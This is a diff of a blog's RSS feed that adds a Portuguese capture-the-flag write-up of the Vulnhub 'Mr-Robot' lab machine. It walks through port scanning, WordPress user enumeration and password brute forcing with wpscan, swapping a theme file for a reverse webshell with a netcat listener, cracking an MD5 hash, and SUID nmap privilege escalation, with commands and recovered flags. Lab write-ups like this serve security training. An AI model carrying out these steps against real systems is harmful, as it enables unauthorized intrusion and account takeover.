@@ -5,9 +5,252 @@
     <description></description>
     <link>http://localhost:4000//</link>
     <atom:link href="http://localhost:4000//feed.xml" rel="self" type="application/rss+xml" />
-    <pubDate>Sat, 22 Aug 2020 17:36:16 -0300</pubDate>
-    <lastBuildDate>Sat, 22 Aug 2020 17:36:16 -0300</lastBuildDate>
+    <pubDate>Tue, 25 Aug 2020 17:22:22 -0300</pubDate>
+    <lastBuildDate>Tue, 25 Aug 2020 17:22:22 -0300</lastBuildDate>
     <generator>Jekyll v3.8.6</generator>
+    
+      <item>
+        <title>Writeup MR-Robot</title>
+        <description>&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/mrrobot.jpg&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Essa máquina é do site &lt;a href=&quot;https://www.vulnhub.com/&quot; target=&quot;_blank&quot;&gt;Vulnhub&lt;/a&gt; e tem três flags que tem que ser encontradas.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;h2 id=&quot;iniciando-a-fase-de-recon&quot;&gt;Iniciando a fase de Recon&lt;/h2&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Começo iniciando um scan de portas com &lt;em&gt;nmap&lt;/em&gt; para identificar qual serviço está rodando no servidor e em qual porta.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/mr-robot# nmap &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; 192.168.56.104
+&lt;span class=&quot;c&quot;&gt;# Nmap 7.80 scan initiated Wed Jun 17 16:41:47 2020 as: nmap -T4 --open -sV -oN nmap.scan 192.168.56.104&lt;/span&gt;
+Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.104
+Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00054s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+Not shown: 997 filtered ports, 1 closed port
+Some closed ports may be reported as filtered due to &lt;span class=&quot;nt&quot;&gt;--defeat-rst-ratelimit&lt;/span&gt;
+PORT    STATE SERVICE  VERSION
+80/tcp  open  http     Apache httpd
+443/tcp open  ssl/http Apache httpd
+MAC Address: 08:00:27:AC:3A:B4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# Nmap done at Wed Jun 17 16:42:06 2020 -- 1 IP address (1 host up) scanned in 18.40 seconds&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Vemos que tem apenas duas portas abertas no servidor, a porta 80 e 443 ambas rodando serviço web http. Acessando pelo navegador temos o seguinte site hospedado.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/index.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+A primeira coisa a fazer ao acessar um site é verificar o robots.txt onde pode conter informações muito importantes.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/robots.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Aqui encontramos dois arquivos a primeira key de três que temos que encontrar e um arquivo que aparentemente é uma tipo de wordlist, primeiro acesso o &lt;em&gt;key-1-of-3.txt&lt;/em&gt; para pegar a primeira &lt;strong&gt;flag&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/key-1.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Acessou normalmente primeira flag :)&lt;/p&gt;
+
+&lt;p&gt;Agora realizado o download do aquivo com a wordlist.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/mr-robot# wget http://192.168.56.104/fsocity.dic
+&lt;span class=&quot;nt&quot;&gt;--2020-06-17&lt;/span&gt; 16:54:22--  http://192.168.56.104/fsocity.dic
+Conectando-se a 192.168.56.104:80... conectado.
+A requisição HTTP foi enviada, aguardando resposta... 200 OK
+Tamanho: 7245381 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;6,9M&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;text/x-c]
+Salvando em: “fsocity.dic”
+
+fsocity.dic                              100%[&lt;span class=&quot;o&quot;&gt;===============================================================================&amp;gt;]&lt;/span&gt;   6,91M  31,0MB/s    em 0,2s    
+
+2020-06-17 16:54:22 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;31,0 MB/s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; - “fsocity.dic” salvo &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;7245381/7245381]
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Verifico o conteúdo do arquivo para ver se realmente é algum tipo de wordlist.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/mr-robot# &lt;span class=&quot;nb&quot;&gt;head &lt;/span&gt;fsocity.dic 
+&lt;span class=&quot;nb&quot;&gt;true
+false
+&lt;/span&gt;wikia
+from
+the
+now
+Wikia
+extensions
+scss
+window
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Realmente é uma wordlist de palavras com certeza teremos que usá-la para realizar algum bruteforce mais para frente.&lt;/p&gt;
+
+&lt;p&gt;Navegando pelo site e olhando seu codigo fonte nada foi encontrado então partimos para tentar identificar algum arquivo ou diretório que se possa acessar por url, para isso utilizo o dirsearch.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/dirsearch.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+No comando mandei ocultar todas respostas com código &lt;strong&gt;301&lt;/strong&gt;,&lt;strong&gt;403&lt;/strong&gt; assim não poluindo muito a tela, e retornou que encontrou um diretorio &lt;strong&gt;/wp-login&lt;/strong&gt; o que significa que está rodando um wordpress, acessando para verificar.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/login.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Tentando acessar com alguma senha padrão como usuário &lt;em&gt;admin&lt;/em&gt; senha &lt;em&gt;admin&lt;/em&gt; vemos que esse usuário não existe.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/login-invalido.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Podemos usar isso para identificar algum usuário válido e como a máquina é referente ao seriado &lt;strong&gt;Mr-Robot&lt;/strong&gt; para quem não assiste basta uma pesquisada no google para conseguir alguns nome de personagens principais.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/personagens.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Após pegar os nomes basta tentar no login até o wordpress informar que o usuário existe, no exemplo utilizei o nome do personagem principal elliot.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/login-elliot.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Observamos que a mensagem de erro alterou agora informa que o password para o usuário Elliot está incorreto, isso quer dizer que achamos um usuário válido.&lt;/p&gt;
+
+&lt;p&gt;Como não temos a senha utilizarei a wordlist para realizar um bruteforce na página de login e para isso irei utilizar a ferramenta &lt;strong&gt;wpscan&lt;/strong&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/mr-robot# wpscan &lt;span class=&quot;nt&quot;&gt;-U&lt;/span&gt; elliot &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; fsocity.dic &lt;span class=&quot;nt&quot;&gt;--url&lt;/span&gt; http://192.168.56.104
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Como vemos o &lt;em&gt;wpscan&lt;/em&gt; conseguiu identificar a senha através do bruteforce com o arquivo obtido anteriormente.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/senha-wordpress.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Senha encontrada, &lt;strong&gt;Usuário&lt;/strong&gt; : &lt;em&gt;Elliot&lt;/em&gt; - &lt;strong&gt;Password&lt;/strong&gt; : &lt;em&gt;ER28-0652&lt;/em&gt; agora basta logar e acessar o wordpress.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/logado.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Logado com sucesso :), mas ainda preciso conseguir um acesso &lt;em&gt;shell&lt;/em&gt; ao sistema e como wordpress é feito em php basta alterar um dos arquivos .php e colocar uma webshell reverse, no caso utilizei o &lt;strong&gt;404.php&lt;/strong&gt; e para isso fui em &lt;strong&gt;Appearance&lt;/strong&gt; -&amp;gt; &lt;strong&gt;Editor&lt;/strong&gt; -&amp;gt; &lt;strong&gt;404.php&lt;/strong&gt;
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/404.png&quot; alt=&quot;&quot; /&gt; 
+&lt;br /&gt;&lt;br /&gt;
+Exclui conteúdo do 404.php e coloquei uma webshell reverse para se conectar na minha máquina na porta &lt;em&gt;4445&lt;/em&gt; e salvei a alteração clicando em &lt;strong&gt;Update File&lt;/strong&gt; .
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/salvar-404.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Após alterar coloco o &lt;em&gt;netcat&lt;/em&gt; na minha máquina para escutar na porta &lt;em&gt;4445&lt;/em&gt; .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/mr-robot# nc &lt;span class=&quot;nt&quot;&gt;-lvnnp&lt;/span&gt; 4445
+Ncat: Version 7.80 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org/ncat &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+Ncat: Listening on :::4445
+Ncat: Listening on 0.0.0.0:4445
+_
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora basta acessar o endereço http://192.168.56.104/404.php e verificar no * netcat* se o servidor realizou a conexão reversa.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/nc-reverse.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Servidor se conectou com sucesso :) agora temos uma shell no servidor e podemos executar comando e procurar a segunda &lt;strong&gt;flag&lt;/strong&gt; .&lt;/p&gt;
+
+&lt;p&gt;Verifico o diretório home para descobrir qual usuário existe no sistema e se tenho acesso a algum arquivo, geralmente é onde se encontra &lt;em&gt;flag&lt;/em&gt;.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; /home
+&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+total 12
+drwxr-xr-x  3 root root 4096 Nov 13  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 22 root root 4096 Sep 16  2015 ..
+drwxr-xr-x  2 root root 4096 Nov 13  2015 robot
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Tem um usuário &lt;em&gt;robot&lt;/em&gt; apesar de ser &lt;strong&gt;usuário&lt;/strong&gt; e &lt;strong&gt;grupo&lt;/strong&gt;  &lt;em&gt;root&lt;/em&gt; temos permissão para acessar.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
+/home/robot
+total 16
+drwxr-xr-x 2 root  root  4096 Nov 13  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
+drwxr-xr-x 3 root  root  4096 Nov 13  2015 ..
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt; 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 robot robot   39 Nov 13  2015 password.raw-md5
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Aqui está a segunda flag mas infelizmente não iremos conseguir ler já que apenas usuário robot tem permissão de leitura e nosso usuário e grupo como podemos ver é o &lt;strong&gt;daemon&lt;/strong&gt; .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;daemon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Se tentamos ler temos o seguinte erro.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-2-of-3.txt
+&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;: key-2-of-3.txt: Permission denied
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Mas temos um segundo arquivo &lt;strong&gt;password.raw-md5&lt;/strong&gt; e esse temos permissão de leitura.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat  &lt;/span&gt;password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+O nome do arquivo já facilita nosso trabalho ele já informa que se trata de um hash md5, então basta quebrar ela com um programa utilizei o &lt;em&gt;John the Ripper&lt;/em&gt; com a wordlist &lt;em&gt;rockyou.txt&lt;/em&gt; .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root@kali:~/mr-robot# john &lt;span class=&quot;nt&quot;&gt;--format&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Raw-MD5 &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt password.raw-md5 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/john-cracked.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Vemos que o &lt;strong&gt;john&lt;/strong&gt; quebrou a hash e identificou a senha e ela é o alfabeto, vamos utilizar ela para alterar nosso usuário para robot e pegar a segunda &lt;em&gt;flag&lt;/em&gt; mas para isso terei que melhorar nossa shell e utilizar uma tty com python  para conseguir utilizar o comando su e alterar para robot, já que essa máquina não tem o serviço &lt;strong&gt;ssh&lt;/strong&gt; rodando.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import pty; pty.spawn(&quot;/bin/bash&quot;)'&lt;/span&gt;
+daemon@linux:/home/robot&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora com bash rodando altero meu login para usuário robot.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;daemon@linux:/home/robot&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+
+robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
+id
+&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1002&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;robot&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Agora pegamos a segunda flag.
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;robot@linux:~&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;
+Para conseguir a ultima flag teremos que realizar uma escalação de privilégio, então faço uma pesquisa no servidor a procura de algum arquivo com &lt;strong&gt;suid&lt;/strong&gt; que resumidamente quando em execução ele roda como usuário root.&lt;/p&gt;
+
+&lt;p&gt;Rodo um find para realizar a busca em todo servidor e jogando todo erro para &lt;strong&gt;/dev/null&lt;/strong&gt; e não poluir a tela.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/find_suid.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Identifico um nmap com &lt;strong&gt;suid&lt;/strong&gt; em uma versão antiga o nmap permitia utilizar uma função interativa e com isso podemos utilizar dessa falha para conseguir fazer uma elevação de previlégio.
+&lt;br /&gt;&lt;br /&gt;
+&lt;img src=&quot;/images/writeup/mr-robot/privesc.png&quot; alt=&quot;&quot; /&gt;
+&lt;br /&gt;&lt;br /&gt;
+Agora temos uma shell com usuário e grupo root e só pegar a terceira flag e máquina finalizada :) .
+&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# pwd; ls -l&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;pwd&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt;
+/root
+total 4
+&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt; 1 root root  0 Nov 13  2015 firstboot_done
+&lt;span class=&quot;nt&quot;&gt;-r--------&lt;/span&gt; 1 root root 33 Nov 13  2015 key-3-of-3.txt
+&lt;span class=&quot;c&quot;&gt;# cat key-3-of-3.txt&lt;/span&gt;
+&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;br /&gt;&lt;br /&gt;&lt;/p&gt;
+</description>
+        <pubDate>Tue, 25 Aug 2020 12:30:00 -0300</pubDate>
+        <link>http://localhost:4000//blog/mr_robot/</link>
+        <guid isPermaLink="true">http://localhost:4000//blog/mr_robot/</guid>
+        
+        <category>writeup</category>
+        
+        <category>ctf</category>
+        
+        <category>hacking</category>
+        
+        
+        <category>blog</category>
+        
+      </item>
     
       <item>
         <title>Writeup Traceback</title>
